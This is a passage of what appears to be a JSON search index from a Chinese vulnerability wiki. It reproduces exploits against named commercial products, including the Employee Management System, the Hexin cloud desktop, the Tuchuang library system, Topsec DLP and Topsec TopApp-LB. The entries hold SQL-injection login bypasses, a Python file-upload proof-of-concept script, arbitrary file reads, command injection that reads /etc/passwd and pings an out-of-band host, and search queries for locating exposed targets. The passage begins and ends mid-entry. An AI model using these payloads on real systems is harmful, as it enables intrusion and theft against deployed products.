","date":"0001-01-01","objectID":"/%E5%91%98%E5%B7%A5%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-employee-management-system-1.0-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/:0:0","tags":null,"title":"","uri":"/%E5%91%98%E5%B7%A5%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-employee-management-system-1.0-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/"},{"categories":null,"content":"漏洞描述 漏洞发现时间：2020-10-16 软件下载地址：https://www.sourcecodester.com/sites/default/files/download/razormist/employee-management-system.zip 验证环境：Windows 10 + xampp v3.2.4 参考链接： https://www.exploit-db.com/exploits/48882 ","date":"0001-01-01","objectID":"/%E5%91%98%E5%B7%A5%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-employee-management-system-1.0-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/:1:0","tags":null,"title":"","uri":"/%E5%91%98%E5%B7%A5%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-employee-management-system-1.0-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/"},{"categories":null,"content":"漏洞复现 打开网址： http://localhost:8081/Employee%20Management%20System/alogin.html 通过payload绕过验证： anki' or 1=1# 发送请求： POST /Employee%20Management%20System/process/aprocess.php HTTP/1.1 Host: localhost:8081 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-GB,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 70 Origin: http://localhost:8081 Connection: close Referer: http://localhost:8081/Employee%20Management%20System/alogin.html Cookie: PHPSESSID=infdfigld4et4jndfgbn33kcsv Upgrade-Insecure-Requests: 1 mailuid=anki%27+or+1%3D1%23\u0026pwd=anki%27+or+1%3D1%23\u0026login-submit=Login 将以Admin身份登录应用 ","date":"0001-01-01","objectID":"/%E5%91%98%E5%B7%A5%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-employee-management-system-1.0-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/:2:0","tags":null,"title":"","uri":"/%E5%91%98%E5%B7%A5%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-employee-management-system-1.0-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/"},{"categories":null,"content":"和信创天云桌面系统 远程命令执行 RCE漏洞 漏洞描述 和信创天云桌面系统存在默认配置导致文件上传并可以远程命令执行 ","date":"0001-01-01","objectID":"/%E5%92%8C%E4%BF%A1%E5%88%9B%E5%A4%A9%E4%BA%91%E6%A1%8C%E9%9D%A2%E7%B3%BB%E7%BB%9F-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-rce%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%92%8C%E4%BF%A1%E5%88%9B%E5%A4%A9%E4%BA%91%E6%A1%8C%E9%9D%A2%E7%B3%BB%E7%BB%9F-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-rce%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 和信创天云桌面系统 ","date":"0001-01-01","objectID":"/%E5%92%8C%E4%BF%A1%E5%88%9B%E5%A4%A9%E4%BA%91%E6%A1%8C%E9%9D%A2%E7%B3%BB%E7%BB%9F-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-rce%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%92%8C%E4%BF%A1%E5%88%9B%E5%A4%A9%E4%BA%91%E6%A1%8C%E9%9D%A2%E7%B3%BB%E7%BB%9F-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-rce%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 发送请求包如下 POST /Upload/upload_file.php?l=1 HTTP/1.1 Host: xxx.xxx.xx.xxx User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,fil;q=0.8 Cookie: think_language=zh-cn; PHPSESSID_NAMED=h9j8utbmv82cb1dcdlav1cgdf6 Connection: close Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv Content-Length: 182 ------WebKitFormBoundaryfcKRltGv Content-Disposition: form-data; name=\"file\"; filename=\"test.php\" Content-Type: image/avif \u003c?php phpinfo(); ?\u003e ------WebKitFormBoundaryfcKRltGv-- 访问 http://xxx.xx.xxx.xxx/Upload/1/test.php ","date":"0001-01-01","objectID":"/%E5%92%8C%E4%BF%A1%E5%88%9B%E5%A4%A9%E4%BA%91%E6%A1%8C%E9%9D%A2%E7%B3%BB%E7%BB%9F-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-rce%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%92%8C%E4%BF%A1%E5%88%9B%E5%A4%A9%E4%BA%91%E6%A1%8C%E9%9D%A2%E7%B3%BB%E7%BB%9F-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-rce%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞POC import requests import sys import random import base64 import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: 和信云桌面任意文件上传漏洞 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCmd \u003e\u003e\u003e whoami \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/Upload/upload_file.php?l=test\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)\", \"Content-Type\": \"multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv\" } data = base64.b64decode(\"Q29udGVudC1UeXBlOiBtdWx0aXBhcnQvZm9ybS1kYXRhOyBib3VuZGFyeT0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5ZmNLUmx0R3YKCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeWZjS1JsdEd2CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iZmlsZSI7IGZpbGVuYW1lPSJ0ZXN0LnBocCIKQ29udGVudC1UeXBlOiBpbWFnZS9hdmlmCgo8P3BocCBwaHBpbmZvKCk7Pz4KLS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5ZmNLUmx0R3YtLQ==\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) if \"Requst\" in response.text and response.status_code == 200: webshell_url = target_url + \"/Upload/test/config.php\" response = requests.get(url=webshell_url, headers=headers,verify=False, timeout=5) if \"shell\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 config.php\\n[o] 路径为 {}/Upload/test/config.php\\033[0m\".format(target_url, target_url)) else: print(\"\\033[31m[x] 请求失败 \\033[0m\") sys.exit(0) else: print(\"\\033[31m[x] 上传失败 \\033[0m\") except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) ","date":"0001-01-01","objectID":"/%E5%92%8C%E4%BF%A1%E5%88%9B%E5%A4%A9%E4%BA%91%E6%A1%8C%E9%9D%A2%E7%B3%BB%E7%BB%9F-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-rce%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%92%8C%E4%BF%A1%E5%88%9B%E5%A4%A9%E4%BA%91%E6%A1%8C%E9%9D%A2%E7%B3%BB%E7%BB%9F-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-rce%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"图创软件 图书馆站群管理系统 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E5%9B%BE%E5%88%9B%E8%BD%AF%E4%BB%B6-%E5%9B%BE%E4%B9%A6%E9%A6%86%E7%AB%99%E7%BE%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%9B%BE%E5%88%9B%E8%BD%AF%E4%BB%B6-%E5%9B%BE%E4%B9%A6%E9%A6%86%E7%AB%99%E7%BE%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 图创软件 图书馆站群管理系统 存在任意文件读取漏洞，攻击者通过漏洞可以读取任意文件 ","date":"0001-01-01","objectID":"/%E5%9B%BE%E5%88%9B%E8%BD%AF%E4%BB%B6-%E5%9B%BE%E4%B9%A6%E9%A6%86%E7%AB%99%E7%BE%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%9B%BE%E5%88%9B%E8%BD%AF%E4%BB%B6-%E5%9B%BE%E4%B9%A6%E9%A6%86%E7%AB%99%E7%BE%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 图创软件 图书馆站群管理系统 ","date":"0001-01-01","objectID":"/%E5%9B%BE%E5%88%9B%E8%BD%AF%E4%BB%B6-%E5%9B%BE%E4%B9%A6%E9%A6%86%E7%AB%99%E7%BE%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%9B%BE%E5%88%9B%E8%BD%AF%E4%BB%B6-%E5%9B%BE%E4%B9%A6%E9%A6%86%E7%AB%99%E7%BE%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"广州图创\" \u0026\u0026 country=\"CN\" \u0026\u0026 body=\"/interlib/common/\" ","date":"0001-01-01","objectID":"/%E5%9B%BE%E5%88%9B%E8%BD%AF%E4%BB%B6-%E5%9B%BE%E4%B9%A6%E9%A6%86%E7%AB%99%E7%BE%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%9B%BE%E5%88%9B%E8%BD%AF%E4%BB%B6-%E5%9B%BE%E4%B9%A6%E9%A6%86%E7%AB%99%E7%BE%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 漏洞请求包为 GET /interlib/report/ShowImage?localPath=C:\\Windows\\system.ini HTTP/1.1 Host: Content-Length: 4 成功读取 system.ini 文件 ","date":"0001-01-01","objectID":"/%E5%9B%BE%E5%88%9B%E8%BD%AF%E4%BB%B6-%E5%9B%BE%E4%B9%A6%E9%A6%86%E7%AB%99%E7%BE%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%9B%BE%E5%88%9B%E8%BD%AF%E4%BB%B6-%E5%9B%BE%E4%B9%A6%E9%A6%86%E7%AB%99%E7%BE%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"天融信 DLP 未授权访问漏洞 ","date":"0001-01-01","objectID":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-dlp-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-dlp-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 天融信DLP存在未授权访问漏洞 ","date":"0001-01-01","objectID":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-dlp-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-dlp-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 天融信DLP ","date":"0001-01-01","objectID":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-dlp-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-dlp-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 POC为 默认用户superman的uid=1 POST /?module-auth_user\u0026action=mod_edit.pwd HTTP/1.1 ","date":"0001-01-01","objectID":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-dlp-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-dlp-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"天融信 TopApp-LB enable_tool_debug.php 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb-enable_tool_debug.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb-enable_tool_debug.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 天融信 TopSec-LB enable_tool_debug.php文件存在 远程命令执行漏洞，通过命令拼接攻击者可以执行任意命令 ","date":"0001-01-01","objectID":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb-enable_tool_debug.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb-enable_tool_debug.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 天融信 TopSec-LB ","date":"0001-01-01","objectID":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb-enable_tool_debug.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb-enable_tool_debug.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"天融信-TopApp-LB-负载均衡系统\" ","date":"0001-01-01","objectID":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb-enable_tool_debug.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb-enable_tool_debug.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 漏洞文件为 enable_tool_debug.php \u003c?php require_once dirname(__FILE__).\"/../common/commandWrapper.inc\"; error_reporting(E_ALL ^ E_WARNING ^ E_NOTICE); $val = $_GET['val']; $tool = $_GET['tool']; $par = $_GET['par']; runTool($val,$tool,$par); ?\u003e commandWrapper.inc 文件中的 runTool function runTool($val,$tool,$par){ if($val==\"0\"){ UciUtil::setValue('system', 'runtool', 'tool', $tool); UciUtil::setValue('system', 'runtool', 'parameter', $par); UciUtil::commit('system'); if($tool==\"1\"){ exec('ping '.$par.'\u003e/tmp/tool_result \u0026'); }else if($tool==\"2\"){ exec('traceroute '.$par.'\u003e/tmp/tool_result \u0026'); } }else if($val==\"1\"){ $tool=UciUtil::getValue('system', 'runtool', 'tool'); if($tool==\"1\"){ exec('killall ping '); }else if($tool==\"2\"){ exec('killall traceroute '); } UciUtil::setValue('system', 'runtool', 'tool', ''); UciUtil::setValue('system', 'runtool', 'parameter', ''); UciUtil::commit('system'); exec('echo \"\"\u003e/tmp/tool_result'); } } 这里设置 var=0，tool=1，再进行命令拼接造成远程命令执行 /acc/tools/enable_tool_debug.php?val=0\u0026tool=1\u0026par=127.0.0.1' | cat /etc/passwd \u003e ../../test.txt |' ","date":"0001-01-01","objectID":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb-enable_tool_debug.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb-enable_tool_debug.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"天融信 TopApp-LB SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 天融信负载均衡 TopAPP-LB产品旧版本在管理面存在SQL注入漏洞，具体为在可以访问管理服务情况 下，攻击者通过构造恶意请求，利用系统检查输入条件不严格的缺陷，进一步可获取部分系统本地信息 ","date":"0001-01-01","objectID":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 天融信负载均衡TopApp-LB ","date":"0001-01-01","objectID":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"天融信-TopApp-LB-负载均衡系统\" ","date":"0001-01-01","objectID":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 利用 天融信负载均衡TopApp-LB 任意登陆 使用后台 提交以下数据包 POST /acc/clsf/report/datasource.php HTTP/1.1 Host: Connection: close Accept: text/javascript, text/html, application/xml, text/xml, */* X-Prototype-Version: 1.6.0.3 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: PHPSESSID=ijqtopbcbmu8d70o5t3kmvgt57 Content-Type: application/x-www-form-urlencoded Content-Length: 201 t=l\u0026e=0\u0026s=t\u0026l=1\u0026vid=2147483647 or 1=1\u0026gid=0\u0026lmt=10\u0026o=r_Speed\u0026asc=false\u0026p=8\u0026lipf=\u0026lipt=\u0026ripf=\u0026ript=\u0026dscp=\u0026proto=\u0026lpf=\u0026lpt=\u0026rpf=\u0026rpt=@。。 存在SQL盲注 ","date":"0001-01-01","objectID":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"天融信 TopApp-LB 命令执行漏洞 ","date":"0001-01-01","objectID":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 天融信负载均衡TopApp-LB系统存在任意命令执行 ","date":"0001-01-01","objectID":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 天融信负载均衡TopApp-LB ","date":"0001-01-01","objectID":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"天融信-TopApp-LB-负载均衡系统\" ","date":"0001-01-01","objectID":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录界面中存在命令执行 账号:1;ping 6km5dk.ceye.io;echo 密码:任意 成功收到请求 ","date":"0001-01-01","objectID":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"天融信 TopApp-LB系统 任意登陆 ","date":"0001-01-01","objectID":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb%E7%B3%BB%E7%BB%9F-%E4%BB%BB%E6%84%8F%E7%99%BB%E9%99%86/:0:0","tags":null,"title":"","uri":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb%E7%B3%BB%E7%BB%9F-%E4%BB%BB%E6%84%8F%E7%99%BB%E9%99%86/"},{"categories":null,"content":"漏洞描述 天融信负载均衡TopApp-LB系统无需密码可直接登陆，查看敏感信息 ","date":"0001-01-01","objectID":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb%E7%B3%BB%E7%BB%9F-%E4%BB%BB%E6%84%8F%E7%99%BB%E9%99%86/:1:0","tags":null,"title":"","uri":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb%E7%B3%BB%E7%BB%9F-%E4%BB%BB%E6%84%8F%E7%99%BB%E9%99%86/"},{"categories":null,"content":"漏洞影响 天融信负载均衡TopApp-LB ","date":"0001-01-01","objectID":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb%E7%B3%BB%E7%BB%9F-%E4%BB%BB%E6%84%8F%E7%99%BB%E9%99%86/:2:0","tags":null,"title":"","uri":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb%E7%B3%BB%E7%BB%9F-%E4%BB%BB%E6%84%8F%E7%99%BB%E9%99%86/"},{"categories":null,"content":"网络测绘 app=\"天融信-TopApp-LB-负载均衡系统\" ","date":"0001-01-01","objectID":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb%E7%B3%BB%E7%BB%9F-%E4%BB%BB%E6%84%8F%E7%99%BB%E9%99%86/:3:0","tags":null,"title":"","uri":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb%E7%B3%BB%E7%BB%9F-%E4%BB%BB%E6%84%8F%E7%99%BB%E9%99%86/"},{"categories":null,"content":"漏洞复现 在登录页面中输入，账号:任意账号 密码:;id 成功登录 ","date":"0001-01-01","objectID":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb%E7%B3%BB%E7%BB%9F-%E4%BB%BB%E6%84%8F%E7%99%BB%E9%99%86/:4:0","tags":null,"title":"","uri":"/%E5%A4%A9%E8%9E%8D%E4%BF%A1-topapp-lb%E7%B3%BB%E7%BB%9F-%E4%BB%BB%E6%84%8F%E7%99%BB%E9%99%86/"},{"categories":null,"content":"孚盟云 AjaxMethod.ashx SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E5%AD%9A%E7%9B%9F%E4%BA%91-ajaxmethod.ashx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%AD%9A%E7%9B%9F%E4%BA%91-ajaxmethod.ashx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 孚盟云 AjaxMethod.ashx文件存在SQL注入漏洞，攻击者通过漏洞可获取服务器权限 ","date":"0001-01-01","objectID":"/%E5%AD%9A%E7%9B%9F%E4%BA%91-ajaxmethod.ashx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%AD%9A%E7%9B%9F%E4%BA%91-ajaxmethod.ashx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 孚盟云 